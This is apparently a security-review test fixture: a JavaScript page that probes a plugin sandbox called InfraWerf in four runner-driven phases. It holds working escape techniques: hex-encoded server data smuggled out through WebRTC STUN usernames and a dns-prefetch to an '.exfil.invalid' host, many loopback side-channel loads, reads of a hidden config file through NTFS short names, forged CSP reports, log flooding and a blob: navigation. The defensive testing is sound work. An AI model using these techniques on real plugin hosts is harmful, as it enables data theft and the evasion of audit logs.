// T047 isolation review fixture. Phase 1 tries network side channels and
// local-origin tricks; phase 2 exhausts the blocked-attempt cap and floods
// the activity log; phase 3 asks for an action to time InfraWerf's dialog;
// phase 4 navigates to a blob: document. The runner drives phases by writing
// go-<n>.txt files into this folder, and judges results from its own
// listeners and InfraWerf's state, not from this page alone.
const R = window.REVIEW, results = {};
const settle = (promise, ms = 3000) => Promise.race([promise, new Promise(resolve => setTimeout(() => resolve("timeout"), ms))]);
const outcome = async (name, attempt) => {
  try { results[name] = { reached: true, value: String(await settle(Promise.resolve().then(attempt))).slice(0, 300) }; }
  catch (error) { results[name] = { reached: false, value: String(error && (error.message || error)).slice(0, 300) }; }
};
const api = path => new URL(`../infrawerf/v1/${path}`, location.href);
const show = () => { document.getElementById("results").textContent = JSON.stringify(results); };
const waitFor = async file => { for (;;) { try { if ((await fetch(file, { cache: "no-store" })).ok) return; } catch {} await new Promise(r => setTimeout(r, 300)); } };
const hex = text => Array.from(new TextEncoder().encode(text)).map(b => b.toString(16).padStart(2, "0")).join("");
const link = (rel, href, extra = {}) => { const l = document.createElement("link"); l.rel = rel; l.href = href; Object.assign(l, extra); document.head.append(l); return "added"; };

async function gather(iceServers) {
  const pc = new RTCPeerConnection({ iceServers });
  pc.createDataChannel("x");
  const candidates = [];
  pc.onicecandidate = e => { if (e.candidate) candidates.push(e.candidate.candidate.split(" ").slice(4, 8).join(" ")); };
  await pc.setLocalDescription(await pc.createOffer());
  await new Promise(r => setTimeout(r, 2500));
  pc.close();
  return `candidates: ${candidates.join(" | ") || "none"}`;
}

// Connectivity checks to a candidate the page chooses, with a username the
// page chooses: the STUN USERNAME carries "<remote ufrag>:<local ufrag>".
async function checks(address, port, secret) {
  const pc = new RTCPeerConnection({ iceServers: [] });
  pc.createDataChannel("x");
  await pc.setLocalDescription(await pc.createOffer());
  const fp = Array.from({ length: 32 }, (_, i) => (i * 7 % 256).toString(16).padStart(2, "0").toUpperCase()).join(":");
  const answer = ["v=0", "o=- 1 2 IN IP4 127.0.0.1", "s=-", "t=0 0", "a=group:BUNDLE 0", "a=msid-semantic: WMS",
    "m=application 9 UDP/DTLS/SCTP webrtc-datachannel", "c=IN IP4 0.0.0.0", "a=mid:0",
    `a=ice-ufrag:${secret}`, "a=ice-pwd:aaaaaaaaaaaaaaaaaaaaaaaa", `a=fingerprint:sha-256 ${fp}`, "a=setup:active", "a=sctp-port:5000",
    `a=candidate:1 1 udp 2130706431 ${address} ${port} typ host`, ""].join("\r\n");
  await pc.setRemoteDescription({ type: "answer", sdp: answer });
  await new Promise(r => setTimeout(r, 3000));
  const state = pc.iceConnectionState;
  pc.close();
  return `ice state ${state}`;
}

(async () => {
  // What a plugin with no grant at all may read: the server's name and host.
  let context = {};
  await outcome("context", async () => { context = await (await fetch(api("context"))).json(); return JSON.stringify(context); });
  const data = hex(`${context.server?.name}|${context.server?.host}`).slice(0, 60);
  results.exfil_payload = { value: data };

  // WebRTC is not governed by the content security policy.
  await outcome("rtc_stun_loopback", () => gather([{ urls: `stun:127.0.0.1:${R.udp}` }]));
  await outcome("rtc_stun_lan", () => gather([{ urls: `stun:${R.lan}:${R.udp}` }]));
  await outcome("rtc_checks_loopback", () => checks("127.0.0.1", R.udp2, `X${data}`.slice(0, 250)));
  await outcome("rtc_checks_lan", () => checks(R.lan, R.udp2, `Y${data}`.slice(0, 250)));

  // Resource hints and other loads to another local origin.
  await outcome("preconnect", () => link("preconnect", `http://127.0.0.1:${R.tcp}`));
  await outcome("dns_prefetch", () => link("dns-prefetch", `http://${data.slice(0, 40)}.exfil.invalid`));
  await outcome("prefetch", () => link("prefetch", `http://127.0.0.1:${R.tcp}/prefetch`));
  await outcome("prerender_rules", () => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prerender: [{ source: "list", urls: [`http://127.0.0.1:${R.tcp}/prerender`] }] }); document.head.append(s); return "added"; });
  await outcome("preload_fetch", () => link("preload", `http://127.0.0.1:${R.tcp}/preload`, { as: "fetch" }));
  await outcome("css_import", () => { const s = document.createElement("style"); s.textContent = `@import url(http://127.0.0.1:${R.tcp}/css-import); body{background:url(http://127.0.0.1:${R.tcp}/css-bg)}`; document.head.append(s); return "added"; });
  await outcome("svg_image", () => { document.body.insertAdjacentHTML("beforeend", `<svg><image href="http://127.0.0.1:${R.tcp}/svg-image" width="1" height="1"/></svg>`); return "added"; });
  await outcome("send_beacon", () => navigator.sendBeacon(`http://127.0.0.1:${R.tcp}/beacon`, "x"));
  await outcome("event_source", () => new Promise((res, rej) => { const e = new EventSource(`http://127.0.0.1:${R.tcp}/sse`); e.onopen = () => res("open"); e.onerror = () => { e.close(); rej(new Error("blocked")); }; }));
  await outcome("anchor_ping", () => { const a = document.createElement("a"); a.href = "#x"; a.ping = `http://127.0.0.1:${R.tcp}/ping`; document.body.append(a); a.click(); return "clicked"; });
  await outcome("anchor_download", () => { const a = document.createElement("a"); a.href = "index.html"; a.download = "x.html"; document.body.append(a); a.click(); return "clicked"; });
  await outcome("window_open_popup", () => { const w = window.open("about:blank", "x", "popup,width=200,height=200"); if (!w) throw new Error("refused"); return "opened"; });
  await outcome("service_worker", () => navigator.serviceWorker.register("attack.js").then(() => "registered"));
  await outcome("webtransport", () => new WebTransport(`https://127.0.0.1:${R.tcp}/wt`).ready.then(() => "ready"));
  await outcome("other_local_origin_fetch", () => fetch(`http://localhost:${location.port}/`).then(r => r.status));
  // An NTFS short name for .hidden-config.json skips the dot-name check
  // where short names exist.
  for (const short of ["HIDDEN~1.JSO", "hidden~1.jso"]) await outcome(`short_name_${short}`, () => fetch(short).then(async r => { if (!r.ok) throw new Error(String(r.status)); return await r.text(); }));
  await outcome("dot_name", () => fetch(".hidden-config.json").then(r => { if (!r.ok) throw new Error(String(r.status)); return "served"; }));
  await outcome("csp_report_forgery", () => fetch(api("csp-report"), { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ "csp-report": { "effective-directive": "InfraWerf: all good, nothing blocked", "blocked-uri": "https://trusted.example/" } }) }).then(r => r.status));
  show(); document.title = "phase1";

  // Phase 2: use up the 40 logged blocks, then flood the activity log with
  // refused requests, which are not capped.
  await waitFor("go-2.txt");
  for (let i = 0; i < 45; i++) await fetch(api(`junk-${i}`)).catch(() => {});
  await fetch(`http://127.0.0.1:${R.tcp}/after-cap`).catch(() => {});
  results.flood = { value: 0 };
  const started = performance.now();
  for (let i = 0; i < R.flood; i++) {
    const r = await fetch(api("actions"), { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ contribution_id: `flood-${i}-${"A".repeat(200)}` }) });
    if (r.status === 403) results.flood.value++;
  }
  results.flood_ms = { value: Math.round(performance.now() - started) };
  show(); document.title = "phase2";

  // Phase 3: ask for a command and record when the request was sent.
  await waitFor("go-3.txt");
  results.ask_sent_at = { value: Date.now() };
  await outcome("ask_kernel", () => fetch(api("actions"), { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ contribution_id: "kernel" }) }).then(r => r.text()));
  show(); document.title = "phase3";

  // Phase 4: navigate to a blob: document on this origin.
  await waitFor("go-4.txt");
  const blobHtml = `<!doctype html><title>blob</title><script>window.INLINE_RAN=true<\/script><script src="${new URL("config.js", location.href)}"><\/script><script src="${new URL("blob-doc.js", location.href)}"><\/script>`;
  location.href = URL.createObjectURL(new Blob([blobHtml], { type: "text/html" }));
})();
